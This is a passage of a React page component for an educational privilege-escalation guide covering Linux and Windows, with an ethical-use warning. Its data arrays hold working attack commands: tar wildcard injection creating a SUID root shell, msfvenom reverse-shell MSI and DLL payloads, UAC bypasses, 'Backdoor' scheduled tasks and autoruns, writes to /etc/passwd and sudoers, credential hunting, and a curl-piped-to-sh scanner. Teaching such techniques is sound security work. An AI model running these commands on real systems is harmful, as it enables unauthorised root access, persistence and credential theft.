        "Execute: /share/rootbash -p"
      ]
    },
    { 
      technique: "Wildcard Injection", 
      description: "Exploiting wildcards in cron/scripts", 
      difficulty: "Medium", 
      tools: "tar, rsync",
      howItWorks: "When scripts use wildcards (*) with certain commands, special filenames can be interpreted as command options, allowing arbitrary command execution.",
      detection: "Check cron scripts for wildcard usage with tar, rsync, chown",
      exploitation: [
        "Example with tar in cron: tar czf backup.tar.gz *",
        "Create checkpoint files:",
        "echo '' > '--checkpoint=1'",
        "echo '' > '--checkpoint-action=exec=sh shell.sh'",
        "echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > shell.sh",
        "Wait for cron execution"
      ]
    },
  ];

  // Windows privesc techniques with detailed exploitation steps
  const windowsTechniques = [
    { 
      technique: "Unquoted Service Paths", 
      description: "Services with spaces in path lacking quotes", 
      difficulty: "Easy", 
      tools: "wmic, PowerUp",
      howItWorks: "When a service path contains spaces and isn't quoted, Windows tries to execute each space-separated part. An attacker can place a malicious executable in the path.",
      detection: 'wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\Windows\\\\"',
      exploitation: [
        'Find unquoted paths: wmic service get name,pathname | findstr /i /v "C:\\Windows"',
        'Check for write permissions to directory',
        'Example: C:\\Program Files\\Some Service\\service.exe',
        'Create: C:\\Program Files\\Some.exe (malicious)',
        'Restart service or wait for reboot'
      ]
    },
    { 
      technique: "Service Misconfigurations", 
      description: "Weak service permissions allowing binary replacement", 
      difficulty: "Medium", 
      tools: "accesschk, PowerUp",
      howItWorks: "If a user can modify the service binary or change the service configuration (binpath), they can execute arbitrary code as SYSTEM when the service restarts.",
      detection: 'accesschk.exe /accepteula -uwcqv "Authenticated Users" * ; sc qc servicename',
      exploitation: [
        'Check service permissions: accesschk.exe -uwcqv "Authenticated Users" *',
        'Find services with SERVICE_CHANGE_CONFIG or SERVICE_ALL_ACCESS',
        'Modify service binary path:',
        'sc config servicename binpath= "C:\\path\\to\\payload.exe"',
        'Restart service: sc stop servicename & sc start servicename',
        'Or replace the actual service binary if writable'
      ]
    },
    { 
      technique: "Always Install Elevated", 
      description: "MSI packages installing with SYSTEM privileges", 
      difficulty: "Easy", 
      tools: "reg query, msfvenom",
      howItWorks: "When AlwaysInstallElevated is enabled, any user can install MSI packages with NT AUTHORITY\\SYSTEM privileges, allowing arbitrary code execution.",
      detection: 'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated',
      exploitation: [
        'Check both registry keys - both must be set to 1',
        'Generate malicious MSI:',
        'msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi > shell.msi',
        'Execute on target: msiexec /quiet /qn /i shell.msi',
        'Catch reverse shell as SYSTEM'
      ]
    },
    { 
      technique: "Token Impersonation", 
      description: "Stealing/impersonating tokens (SeImpersonate)", 
      difficulty: "Medium", 
      tools: "Potato family, PrintSpoofer",
      howItWorks: "With SeImpersonatePrivilege, a user can impersonate tokens of other processes. Tools like JuicyPotato, PrintSpoofer abuse this to get SYSTEM tokens.",
      detection: 'whoami /priv | findstr "SeImpersonate SeAssignPrimaryToken"',
      exploitation: [
        'Check privileges: whoami /priv',
        'Look for SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege',
        'PrintSpoofer (Windows 10/Server 2016-2019):',
        'PrintSpoofer.exe -i -c "cmd /c whoami"',
        'JuicyPotato (older Windows):',
        'JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -a "/c whoami" -t *',
        'GodPotato (Windows 2012-2022):',
        'GodPotato.exe -cmd "cmd /c whoami"'
      ]
    },
    { 
      technique: "DLL Hijacking", 
      description: "Replacing missing DLLs loaded by privileged processes", 
      difficulty: "Medium", 
      tools: "Process Monitor, msfvenom",
      howItWorks: "When a program loads a DLL, it searches directories in a specific order. If a directory in the search path is writable, a malicious DLL can be placed there.",
      detection: 'Use Process Monitor to find "NAME NOT FOUND" DLL loads by elevated processes',
      exploitation: [
        'Run Process Monitor as admin',
        'Filter: Result = NAME NOT FOUND, Path ends with .dll',
        'Find missing DLL in writable location',
        'Generate malicious DLL:',
        'msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f dll > hijack.dll',
        'Place in writable directory before legitimate DLL',
        'Wait for service/program restart'
      ]
    },
    { 
      technique: "UAC Bypass", 
      description: "Bypassing User Account Control", 
      difficulty: "Hard", 
      tools: "UACME, fodhelper",
      howItWorks: "UAC bypass techniques exploit auto-elevated binaries or trusted paths to run code with elevated privileges without triggering a UAC prompt.",
      detection: 'Check UAC level: reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System',
      exploitation: [
        'fodhelper bypass (works on Windows 10):',
        'reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d "cmd.exe" /f',
        'reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /t REG_SZ /f',
        'fodhelper.exe',
        'eventvwr bypass:',
        'reg add HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /d "cmd.exe" /f',
        'eventvwr.exe',
        'UACME has 70+ methods: UACME akagi32.exe 23'
      ]
    },
    { 
      technique: "Scheduled Tasks", 
      description: "Writable scheduled task binaries/scripts", 
      difficulty: "Medium", 
      tools: "schtasks, accesschk",
      howItWorks: "Scheduled tasks run programs at specific times or events. If the binary or script is writable, it can be replaced with malicious code.",
      detection: 'schtasks /query /fo LIST /v\naccesschk.exe -dqv "C:\\path\\to\\task\\binary"',
      exploitation: [
        'List scheduled tasks: schtasks /query /fo LIST /v',
        'Check binary permissions: icacls "C:\\path\\to\\binary.exe"',
        'If writable, replace with payload',
        'Or create new task if permissions allow:',
        'schtasks /create /tn "Backdoor" /tr "C:\\payload.exe" /sc onlogon /ru SYSTEM'
      ]
    },
    { 
      technique: "Registry Autorun", 
      description: "Writable autorun registry keys", 
      difficulty: "Easy", 
      tools: "reg query, accesschk",
      howItWorks: "Programs can be configured to run at startup via registry keys. If autorun entries point to writable paths, the binary can be replaced.",
      detection: 'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',
      exploitation: [
        'Query autorun entries:',
        'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',
        'Check permissions on binaries: icacls "C:\\path\\to\\binary.exe"',
        'Replace writable binary with payload',
        'Or add new autorun (requires admin):',
        'reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /d "C:\\payload.exe"'
      ]
    },
  ];

  // Essential tools with expanded details
  const essentialTools = [
    { name: "LinPEAS", platform: "Linux", description: "Comprehensive Linux privilege escalation scanner - checks permissions, capabilities, crons, services, and more", url: "https://github.com/carlospolop/PEASS-ng", usage: "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh" },
    { name: "WinPEAS", platform: "Windows", description: "Comprehensive Windows privilege escalation scanner - checks services, registry, credentials, and more", url: "https://github.com/carlospolop/PEASS-ng", usage: "winPEASx64.exe" },
    { name: "LinEnum", platform: "Linux", description: "Linux enumeration script - quick system reconnaissance", url: "https://github.com/rebootuser/LinEnum", usage: "./LinEnum.sh -t" },
    { name: "PowerUp", platform: "Windows", description: "PowerShell privesc scanner from PowerSploit - service misconfigs, DLL hijacking, registry", url: "https://github.com/PowerShellMafia/PowerSploit", usage: "Import-Module PowerUp.ps1; Invoke-AllChecks" },
    { name: "linux-exploit-suggester", platform: "Linux", description: "Suggests kernel exploits based on kernel version", url: "https://github.com/mzet-/linux-exploit-suggester", usage: "./linux-exploit-suggester.sh" },
    { name: "Windows Exploit Suggester", platform: "Windows", description: "Suggests exploits based on systeminfo output", url: "https://github.com/AonCyberLabs/Windows-Exploit-Suggester", usage: "python wes.py --database db.xlsx --systeminfo sysinfo.txt" },
    { name: "BeRoot", platform: "Both", description: "Multi-platform privesc checker - Python-based", url: "https://github.com/AlessandroZ/BeRoot", usage: "python beroot.py" },
    { name: "GTFOBins", platform: "Linux", description: "Unix binaries for privilege escalation - SUID, sudo, capabilities", url: "https://gtfobins.github.io/", usage: "Web reference for binary exploitation" },
    { name: "LOLBAS", platform: "Windows", description: "Living Off The Land Binaries and Scripts - legitimate Windows tools for attacks", url: "https://lolbas-project.github.io/", usage: "Web reference for binary abuse" },
    { name: "PrintSpoofer", platform: "Windows", description: "Token impersonation for SeImpersonatePrivilege - Windows 10/Server 2016+", url: "https://github.com/itm4n/PrintSpoofer", usage: "PrintSpoofer.exe -i -c cmd" },
    { name: "GodPotato", platform: "Windows", description: "Latest potato exploit - Windows Server 2012-2022", url: "https://github.com/BeichenDream/GodPotato", usage: "GodPotato.exe -cmd 'cmd /c whoami'" },
    { name: "pspy", platform: "Linux", description: "Monitor Linux processes without root - great for finding cron jobs", url: "https://github.com/DominicBreuker/pspy", usage: "./pspy64 -pf -i 1000" },
  ];

  // Common misconfigurations with details
  const commonMisconfigs = [
    { config: "world-writable /etc/passwd", risk: "Critical", description: "Add new root user", example: "echo 'root2:$(openssl passwd -1 pass):0:0:root:/root:/bin/bash' >> /etc/passwd" },
    { config: "Sudo NOPASSWD on sensitive binaries", risk: "Critical", description: "Execute commands as root", example: "sudo vim -c ':!/bin/sh'" },
    { config: "SUID on editors/interpreters", risk: "High", description: "Spawn root shell", example: "/usr/bin/python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'" },
    { config: "Weak file permissions on /etc/shadow", risk: "High", description: "Crack password hashes", example: "john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt" },
    { config: "Writable cron scripts", risk: "High", description: "Execute code as root", example: "echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /opt/scripts/backup.sh" },
    { config: "Docker group membership", risk: "Critical", description: "Mount host filesystem", example: "docker run -v /:/mnt --rm -it alpine chroot /mnt sh" },
    { config: "Weak service permissions (Windows)", risk: "High", description: "Replace service binary", example: "sc config service binpath= 'C:\\path\\to\\shell.exe'" },
    { config: "SeImpersonate privilege", risk: "High", description: "Token impersonation to SYSTEM", example: "PrintSpoofer.exe -i -c cmd" },
    { config: "LXC/LXD group membership", risk: "Critical", description: "Mount host filesystem via container", example: "lxc init ubuntu:16.04 exploit -c security.privileged=true" },
    { config: "Readable SSH private keys", risk: "High", description: "SSH as other users", example: "ssh -i /home/user/.ssh/id_rsa root@localhost" },
    { config: "Writable /etc/sudoers", risk: "Critical", description: "Grant full sudo access", example: "echo 'user ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers" },
    { config: "History files with credentials", risk: "Medium", description: "Find stored passwords", example: "cat ~/.bash_history | grep -i 'pass\\|secret\\|key'" },
  ];

  // Kernel exploits database
  const kernelExploits = [
    { name: "DirtyPipe", cve: "CVE-2022-0847", kernel: "5.8 - 5.16.11", description: "Overwrite read-only files via pipe", difficulty: "Easy" },
    { name: "DirtyCow", cve: "CVE-2016-5195", kernel: "2.6.22 - 4.8.3", description: "Race condition in copy-on-write", difficulty: "Medium" },
    { name: "Overlayfs", cve: "CVE-2021-3493", kernel: "Ubuntu < 5.11", description: "User namespace privilege escalation", difficulty: "Easy" },
    { name: "PwnKit", cve: "CVE-2021-4034", kernel: "All (pkexec)", description: "Polkit pkexec local privilege escalation", difficulty: "Easy" },
    { name: "Sudo Baron Samedit", cve: "CVE-2021-3156", kernel: "Sudo < 1.9.5p2", description: "Heap overflow in sudoedit", difficulty: "Medium" },
    { name: "Netfilter", cve: "CVE-2022-25636", kernel: "5.4 - 5.6.10", description: "Heap out-of-bounds write in nf_tables", difficulty: "Hard" },
    { name: "Sequoia", cve: "CVE-2021-33909", kernel: "< 5.13.4", description: "Filesystem layer size_t overflow", difficulty: "Medium" },
    { name: "GameOver(lay)", cve: "CVE-2023-0386", kernel: "Ubuntu < 6.2", description: "OverlayFS privilege escalation", difficulty: "Easy" },
  ];

  // Enumeration checklist
  const enumerationChecklist = [
    { category: "System Information", icon: <ComputerIcon />, items: ["OS version and architecture", "Kernel version", "Hostname and domain", "Environment variables", "Installed patches/hotfixes"] },
    { category: "User & Group Info", icon: <GroupIcon />, items: ["Current user and groups", "Other users on system", "Logged in users", "Password policy", "Sudo permissions"] },
    { category: "Network Configuration", icon: <NetworkCheckIcon />, items: ["IP addresses and interfaces", "Routing table", "ARP cache", "Open ports and services", "Firewall rules", "DNS configuration"] },
    { category: "Running Processes", icon: <MemoryIcon />, items: ["Processes running as root/SYSTEM", "Services and their paths", "Cron jobs / Scheduled tasks", "Running applications"] },
    { category: "File System", icon: <FolderIcon />, items: ["SUID/SGID binaries", "World-writable directories", "Configuration files", "Backup files", "Log files with credentials"] },
    { category: "Credentials", icon: <VpnKeyIcon />, items: ["Config files with passwords", "SSH keys", "Browser saved passwords", "Database connection strings", "History files", "Cached credentials"] },
  ];

  const pageContext = `This page covers privilege escalation techniques for both Linux and Windows systems. Topics include SUID/SGID binaries, sudo misconfigurations, cron jobs, kernel exploits, capabilities, PATH hijacking, NFS no_root_squash, wildcard injection for Linux. For Windows: unquoted service paths, service misconfigurations, AlwaysInstallElevated, token impersonation (SeImpersonate), DLL hijacking, UAC bypass, scheduled tasks, and registry autorun. The page also covers enumeration methodology, kernel exploits database (DirtyPipe, DirtyCow, PwnKit, etc.), essential tools (LinPEAS, WinPEAS, PowerUp, PrintSpoofer, etc.), and learning resources.`;

  return (
    <LearnPageLayout pageTitle="Privilege Escalation Guide" pageContext={pageContext}>
    <Container maxWidth="xl" sx={{ py: 4 }}>
      {/* Header */}
      <Box sx={{ mb: 4 }}>
        <Chip
          component={Link}
          to="/learn"
          icon={<ArrowBackIcon />}
          label="Back to Learning Hub"
          clickable
          variant="outlined"
          sx={{ borderRadius: 2, mb: 2 }}
        />
        <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 2 }}>
          <AdminPanelSettingsIcon sx={{ fontSize: 48, color: "#ef4444" }} />
          <Box>
            <Typography variant="h3" sx={{ fontWeight: 800, color: "white" }}>
              Privilege Escalation Guide
            </Typography>
            <Typography variant="h6" sx={{ color: "grey.400" }}>
              Linux & Windows techniques for elevating access from user to root/SYSTEM
            </Typography>
          </Box>
        </Box>
        <Box sx={{ display: "flex", gap: 1, flexWrap: "wrap" }}>
          {["Linux", "Windows", "GTFOBins", "LOLBAS", "Kernel Exploits", "Token Impersonation"].map((tag) => (
            <Chip key={tag} label={tag} size="small" sx={{ bgcolor: alpha("#ef4444", 0.2), color: "#ef4444" }} />
          ))}
        </Box>
      </Box>

      {/* Overview Alert */}
      <Alert severity="warning" sx={{ mb: 3, bgcolor: alpha("#f59e0b", 0.1) }}>
        <Typography variant="body2">
          <strong>Ethical Use Only:</strong> These techniques should only be used in authorized penetration tests, 
          CTF competitions, or on systems you own. Unauthorized access to computer systems is illegal.
        </Typography>
      </Alert>

      {/* Tabs */}
      <Paper sx={{ bgcolor: "#111118", borderRadius: 2, mb: 3 }}>
        <Tabs
          value={tabValue}
          onChange={handleTabChange}
          variant="scrollable"
          scrollButtons="auto"
          sx={{
            "& .MuiTab-root": { color: "grey.500", textTransform: "none", fontWeight: 600 },
            "& .Mui-selected": { color: "#ef4444" },
            "& .MuiTabs-indicator": { bgcolor: "#ef4444" },
          }}
        >
          <Tab label="Overview" icon={<TipsAndUpdatesIcon />} iconPosition="start" />
          <Tab label="Linux Privesc" icon={<TerminalIcon />} iconPosition="start" />
          <Tab label="Windows Privesc" icon={<ComputerIcon />} iconPosition="start" />
          <Tab label="Enumeration" icon={<SecurityIcon />} iconPosition="start" />
          <Tab label="Kernel Exploits" icon={<BugReportIcon />} iconPosition="start" />
          <Tab label="Tools" icon={<BuildIcon />} iconPosition="start" />
          <Tab label="Resources" icon={<SchoolIcon />} iconPosition="start" />
        </Tabs>
      </Paper>

      {/* Tab 0: Overview */}
      <TabPanel value={tabValue} index={0}>
        <Grid container spacing={3}>
          <Grid item xs={12}>
            <Paper sx={{ p: 3, bgcolor: "#111118", borderRadius: 2 }}>
              <Typography variant="h5" sx={{ color: "#ef4444", mb: 2, fontWeight: 700 }}>
                What is Privilege Escalation?
              </Typography>
              <Typography variant="body1" sx={{ color: "grey.300", mb: 3 }}>
                Privilege escalation is the act of exploiting a bug, design flaw, or configuration oversight to gain 
                elevated access to resources that are normally protected. It's a critical phase in penetration testing, 
                typically occurring after initial access has been obtained.
              </Typography>
              
              <Grid container spacing={2} sx={{ mb: 4 }}>
                <Grid item xs={12} md={6}>
                  <Card sx={{ bgcolor: alpha("#22c55e", 0.1), border: "1px solid rgba(34, 197, 94, 0.3)", height: "100%" }}>
                    <CardContent>
                      <Typography variant="h6" sx={{ color: "#22c55e", mb: 1, fontWeight: 700 }}>
                        Horizontal Privilege Escalation
                      </Typography>
                      <Typography variant="body2" sx={{ color: "grey.300", mb: 2 }}>
                        Accessing resources of another user with the same privilege level. Example: User A accessing User B's files.
                      </Typography>
                      <Box sx={{ bgcolor: alpha("#22c55e", 0.1), p: 2, borderRadius: 1 }}>
                        <Typography variant="caption" sx={{ color: "#22c55e", fontFamily: "monospace" }}>
                          Common vectors: Session hijacking, IDOR, Cookie manipulation, Shared resources
                        </Typography>
                      </Box>
                    </CardContent>
                  </Card>
                </Grid>
                <Grid item xs={12} md={6}>
                  <Card sx={{ bgcolor: alpha("#ef4444", 0.1), border: "1px solid rgba(239, 68, 68, 0.3)", height: "100%" }}>
                    <CardContent>
                      <Typography variant="h6" sx={{ color: "#ef4444", mb: 1, fontWeight: 700 }}>
                        Vertical Privilege Escalation
                      </Typography>
                      <Typography variant="body2" sx={{ color: "grey.300", mb: 2 }}>
                        Elevating from lower to higher privilege level. Example: Standard user → root/Administrator/SYSTEM.
                      </Typography>
                      <Box sx={{ bgcolor: alpha("#ef4444", 0.1), p: 2, borderRadius: 1 }}>
                        <Typography variant="caption" sx={{ color: "#ef4444", fontFamily: "monospace" }}>
                          Common vectors: Kernel exploits, SUID abuse, Token impersonation, Service misconfigs
                        </Typography>
                      </Box>
                    </CardContent>
                  </Card>
                </Grid>
              </Grid>

              {/* Attack Methodology */}
              <Typography variant="h6" sx={{ color: "#ef4444", mb: 2, fontWeight: 700 }}>
                Privilege Escalation Methodology
              </Typography>
              <Stepper orientation="vertical" sx={{ mb: 4 }}>
                {[
                  { label: "Enumerate System", description: "Gather information about the target system - OS, version, patches, users, groups" },
                  { label: "Identify Misconfigurations", description: "Look for weak permissions, insecure services, scheduled tasks, SUID binaries" },
                  { label: "Search for Credentials", description: "Check config files, history, environment variables, cached credentials" },
                  { label: "Find Exploits", description: "Match kernel/software versions against known CVEs and public exploits" },
                  { label: "Exploit & Escalate", description: "Execute the exploit and verify elevated access" },
                  { label: "Maintain Access", description: "Establish persistence if authorized in the engagement scope" },
                ].map((step, index) => (
                  <Step key={step.label} active>
                    <StepLabel StepIconProps={{ sx: { color: "#ef4444" } }}>
                      <Typography sx={{ color: "white", fontWeight: 600 }}>{step.label}</Typography>
                    </StepLabel>
                    <StepContent>
                      <Typography variant="body2" sx={{ color: "grey.400" }}>{step.description}</Typography>
                    </StepContent>
                  </Step>
                ))}
              </Stepper>
            </Paper>
          </Grid>

          <Grid item xs={12}>
            <Paper sx={{ p: 3, bgcolor: "#111118", borderRadius: 2 }}>
              <Typography variant="h6" sx={{ color: "#ef4444", mb: 2, fontWeight: 700 }}>
                Common Misconfigurations
              </Typography>
              <TableContainer>
                <Table size="small">
                  <TableHead>
                    <TableRow>
                      <TableCell sx={{ color: "#ef4444", fontWeight: 700 }}>Configuration</TableCell>
                      <TableCell sx={{ color: "#ef4444", fontWeight: 700 }}>Risk</TableCell>
                      <TableCell sx={{ color: "#ef4444", fontWeight: 700 }}>Impact</TableCell>
                      <TableCell sx={{ color: "#ef4444", fontWeight: 700 }}>Example</TableCell>
                    </TableRow>
                  </TableHead>
                  <TableBody>
                    {commonMisconfigs.map((row) => (
                      <TableRow key={row.config}>
                        <TableCell sx={{ color: "white", fontFamily: "monospace", fontSize: "0.8rem" }}>{row.config}</TableCell>
                        <TableCell>
                          <Chip 
                            label={row.risk} 
                            size="small" 
                            sx={{ 
                              bgcolor: alpha(row.risk === "Critical" ? "#ef4444" : row.risk === "High" ? "#f59e0b" : "#22c55e", 0.2),
                              color: row.risk === "Critical" ? "#ef4444" : row.risk === "High" ? "#f59e0b" : "#22c55e",
                            }} 
                          />
                        </TableCell>
                        <TableCell sx={{ color: "grey.300" }}>{row.description}</TableCell>
                        <TableCell sx={{ color: "grey.400", fontFamily: "monospace", fontSize: "0.75rem", maxWidth: 300, wordBreak: "break-all" }}>{row.example}</TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </TableContainer>
            </Paper>
          </Grid>

          {/* Quick Reference Cards */}
          <Grid item xs={12} md={4}>
            <Paper sx={{ p: 3, bgcolor: "#111118", borderRadius: 2, height: "100%" }}>
              <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 2 }}>
                <TerminalIcon sx={{ color: "#f59e0b" }} />
                <Typography variant="h6" sx={{ color: "#f59e0b", fontWeight: 700 }}>
                  Linux Quick Wins
                </Typography>
              </Box>
              <List dense>
                {["sudo -l", "find / -perm -4000 2>/dev/null", "getcap -r / 2>/dev/null", "cat /etc/crontab", "ls -la /etc/passwd", "ps aux | grep root"].map((cmd) => (
                  <ListItem key={cmd} sx={{ px: 0, py: 0.5 }}>
                    <ListItemText 
                      primary={<Typography variant="body2" sx={{ color: "#c9d1d9", fontFamily: "monospace", fontSize: "0.8rem" }}>{cmd}</Typography>}
                    />
                  </ListItem>
                ))}
              </List>
            </Paper>
          </Grid>
          <Grid item xs={12} md={4}>
            <Paper sx={{ p: 3, bgcolor: "#111118", borderRadius: 2, height: "100%" }}>
              <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 2 }}>
                <ComputerIcon sx={{ color: "#3b82f6" }} />
                <Typography variant="h6" sx={{ color: "#3b82f6", fontWeight: 700 }}>
                  Windows Quick Wins
                </Typography>
              </Box>
              <List dense>
                {["whoami /priv", "systeminfo | findstr /B /C:'OS'", "wmic service get name,pathname", "reg query HKLM\\...\\Run", "schtasks /query /fo LIST", "netstat -ano"].map((cmd) => (
                  <ListItem key={cmd} sx={{ px: 0, py: 0.5 }}>
                    <ListItemText 
                      primary={<Typography variant="body2" sx={{ color: "#c9d1d9", fontFamily: "monospace", fontSize: "0.8rem" }}>{cmd}</Typography>}
                    />
                  </ListItem>
                ))}
              </List>
            </Paper>
          </Grid>
          <Grid item xs={12} md={4}>
            <Paper sx={{ p: 3, bgcolor: "#111118", borderRadius: 2, height: "100%" }}>
              <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 2 }}>
                <VpnKeyIcon sx={{ color: "#22c55e" }} />
                <Typography variant="h6" sx={{ color: "#22c55e", fontWeight: 700 }}>
                  Credential Hunting
                </Typography>
              </Box>
              <List dense>
                {["~/.bash_history", "config files (web.config, wp-config.php)", "/etc/shadow (if readable)", "SSH keys in /home/*/.ssh", "Browser saved passwords", "Database connection strings"].map((item) => (
                  <ListItem key={item} sx={{ px: 0, py: 0.5 }}>
                    <ListItemText 
                      primary={<Typography variant="body2" sx={{ color: "#c9d1d9", fontSize: "0.85rem" }}>{item}</Typography>}
                    />
                  </ListItem>
                ))}
              </List>
            </Paper>
          </Grid>
        </Grid>
      </TabPanel>

      {/* Tab 1: Linux Privesc */}
      <TabPanel value={tabValue} index={1}>
        <Grid container spacing={3}>
          <Grid item xs={12}>
            <Paper sx={{ p: 3, bgcolor: "#111118", borderRadius: 2 }}>
              <Typography variant="h5" sx={{ color: "#ef4444", mb: 2, fontWeight: 700 }}>
                Linux Privilege Escalation Techniques
              </Typography>
              <Typography variant="body2" sx={{ color: "grey.400", mb: 3 }}>
                Linux privesc typically involves exploiting misconfigurations, vulnerable SUID binaries, kernel exploits, or weak permissions.
                Click on each technique to see detailed exploitation steps.
              </Typography>

              {/* Techniques as Accordions */}
              {linuxTechniques.map((technique) => (
                <Accordion 
                  key={technique.technique}
                  sx={{ 
                    bgcolor: alpha("#1a1a2e", 0.8), 
                    mb: 1,
                    "&:before": { display: "none" },
                    border: `1px solid ${alpha("#ef4444", 0.2)}`,
                    borderRadius: "8px !important",
                  }}
                >
                  <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: "#ef4444" }} />}>
                    <Box sx={{ display: "flex", alignItems: "center", gap: 2, width: "100%" }}>
                      <Typography sx={{ color: "white", fontWeight: 600, flex: 1 }}>{technique.technique}</Typography>
                      <Chip 
                        label={technique.difficulty} 
                        size="small" 
                        sx={{ 
                          bgcolor: alpha(
                            technique.difficulty === "Easy" ? "#22c55e" : 
                            technique.difficulty === "Medium" ? "#f59e0b" : "#ef4444", 0.2
                          ),
                          color: technique.difficulty === "Easy" ? "#22c55e" : 
                                 technique.difficulty === "Medium" ? "#f59e0b" : "#ef4444",
                        }} 
                      />
                    </Box>
                  </AccordionSummary>
                  <AccordionDetails>
                    <Typography variant="body2" sx={{ color: "grey.300", mb: 2 }}>
                      {technique.howItWorks}
                    </Typography>
                    
                    <Typography variant="subtitle2" sx={{ color: "#ef4444", mb: 1, fontWeight: 600 }}>
                      Detection Command:
                    </Typography>
                    <Box sx={{ bgcolor: "#0d1117", p: 1.5, borderRadius: 1, mb: 2, fontFamily: "monospace", fontSize: "0.85rem", color: "#c9d1d9" }}>
                      {technique.detection}
                    </Box>
                    
                    <Typography variant="subtitle2" sx={{ color: "#ef4444", mb: 1, fontWeight: 600 }}>
                      Exploitation Steps:
                    </Typography>
                    <List dense>
                      {technique.exploitation.map((step, idx) => (
                        <ListItem key={idx} sx={{ px: 0, py: 0.25 }}>
                          <ListItemIcon sx={{ minWidth: 28 }}>
                            <PlayArrowIcon sx={{ color: "#22c55e", fontSize: 16 }} />
                          </ListItemIcon>
                          <ListItemText 
                            primary={<Typography variant="body2" sx={{ color: "grey.300", fontFamily: step.includes(':') ? "inherit" : "monospace", fontSize: "0.85rem" }}>{step}</Typography>}
                          />
                        </ListItem>
                      ))}
                    </List>
                    
                    <Box sx={{ mt: 2, display: "flex", gap: 1 }}>
                      <Chip label={`Tools: ${technique.tools}`} size="small" sx={{ bgcolor: alpha("#3b82f6", 0.2), color: "#3b82f6" }} />
                    </Box>
                  </AccordionDetails>
                </Accordion>
              ))}
            </Paper>
          </Grid>

          <Grid item xs={12}>
            <Paper sx={{ p: 3, bgcolor: "#111118", borderRadius: 2 }}>
              <Typography variant="h6" sx={{ color: "#ef4444", mb: 2, fontWeight: 700 }}>
                Comprehensive Linux Enumeration Commands
              </Typography>
              
              <CodeBlock
                title="System Information"
                language="bash"
                code={`# OS and Kernel
uname -a
cat /etc/os-release
cat /etc/issue
hostnamectl

# Architecture
arch
file /bin/ls

# Environment
env
cat /etc/profile
cat ~/.bashrc`}
              />

              <CodeBlock
                title="User Enumeration"
                language="bash"
                code={`# Current user context
id
whoami
groups

# All users
cat /etc/passwd
cat /etc/shadow 2>/dev/null
cat /etc/group

# Sudo permissions
sudo -l
cat /etc/sudoers 2>/dev/null

# Login history
lastlog
last`}
              />

              <CodeBlock
                title="SUID/SGID & Capabilities"
                language="bash"
                code={`# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Find SGID binaries  
find / -perm -2000 -type f 2>/dev/null

# Find capabilities
getcap -r / 2>/dev/null

# Common exploitable SUID binaries
# Check GTFOBins for: nmap, vim, find, bash, more, less, nano, cp, mv, awk, python, perl, ruby`}
              />

              <CodeBlock
                title="Cron Jobs & Scheduled Tasks"
                language="bash"
                code={`# System crontabs
cat /etc/crontab
ls -la /etc/cron.*

# User crontabs
crontab -l
ls -la /var/spool/cron/crontabs/ 2>/dev/null

# Systemd timers
systemctl list-timers --all

# Monitor processes for cron execution
# Download pspy: https://github.com/DominicBreuker/pspy
./pspy64 -pf -i 1000`}
              />

              <CodeBlock
                title="Network & Services"
                language="bash"
                code={`# Network configuration
ip a
ifconfig
route -n
cat /etc/resolv.conf

# Open ports
netstat -tulpn
ss -tulpn

# Active connections
netstat -ano

# Services
systemctl list-units --type=service
service --status-all`}
              />

              <CodeBlock
                title="Credential Hunting"
                language="bash"
                code={`# History files
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.nano_history

# SSH keys
find / -name "id_rsa" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null

# Config files with passwords
grep -r "password" /etc/ 2>/dev/null
grep -r "pass" /var/www/ 2>/dev/null
find / -name "*.conf" -exec grep -l "password" {} \\; 2>/dev/null

# Database files
find / -name "*.db" -o -name "*.sqlite" 2>/dev/null`}
              />
            </Paper>
          </Grid>

          <Grid item xs={12}>
            <Alert severity="info" sx={{ bgcolor: alpha("#3b82f6", 0.1) }}>
              <Typography variant="body2">
                <strong>Pro Tip:</strong> Always run LinPEAS first for comprehensive enumeration, then manually investigate 
                interesting findings. Check GTFOBins (gtfobins.github.io) for any unusual SUID binaries or sudo permissions.
              </Typography>
            </Alert>
          </Grid>
        </Grid>
      </TabPanel>

      {/* Tab 2: Windows Privesc */}
      <TabPanel value={tabValue} index={2}>
        <Grid container spacing={3}>
          <Grid item xs={12}>
            <Paper sx={{ p: 3, bgcolor: "#111118", borderRadius: 2 }}>
              <Typography variant="h5" sx={{ color: "#ef4444", mb: 2, fontWeight: 700 }}>
                Windows Privilege Escalation Techniques
              </Typography>
              <Typography variant="body2" sx={{ color: "grey.400", mb: 3 }}>
                Windows privesc often involves service misconfigurations, token manipulation, DLL hijacking, or UAC bypass.
                Click on each technique to see detailed exploitation steps.
              </Typography>

              {/* Techniques as Accordions */}
